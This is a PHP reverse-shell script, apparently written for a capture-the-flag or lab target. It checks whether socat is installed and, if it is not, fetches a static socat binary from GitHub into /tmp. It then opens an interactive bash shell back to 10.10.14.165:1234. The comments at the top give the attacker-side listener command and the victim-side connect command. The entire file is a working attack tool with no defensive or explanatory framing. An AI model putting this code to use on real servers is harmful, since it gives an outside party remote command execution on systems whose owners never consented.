<?php

// run this on attacker machine:            socat file:`tty`,raw,echo=0 tcp-listen:12345
// pretend to be victim:                    socat tcp-connect:localhost:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
// run this on victim for better shell:     /tmp/socat tcp-connect:10.10.14.165:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane

function echobr($s)
{
    return str_replace("\n", "<br/>", $s);
}

echobr("<pre><code>"); //too lazy to view source :3

$cmd = 'socat';
$ip = '10.10.14.165';
$port = '1234';

$out = null;

if (`which socat`) {
    echobr("socat exists!");
} else {
    echobr("socat does not exist!");

    echo shell_exec("wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat"), "\n";

    echo shell_exec("chmod +x /tmp/socat"), "\n";

    echo shell_exec("ls -lash /tmp/socat"), "\n";

    echo shell_exec("ls /tmp"), "\n";

    $cmd = '/tmp/socat';
}

$command = $cmd . " tcp:" . $ip . ":" . $port . " exec:'bash -i' ,pty,stderr,setsid,sigint,sane";

echo "Running this:";

echo $command;

echobr(shell_exec($command));

echo "done";
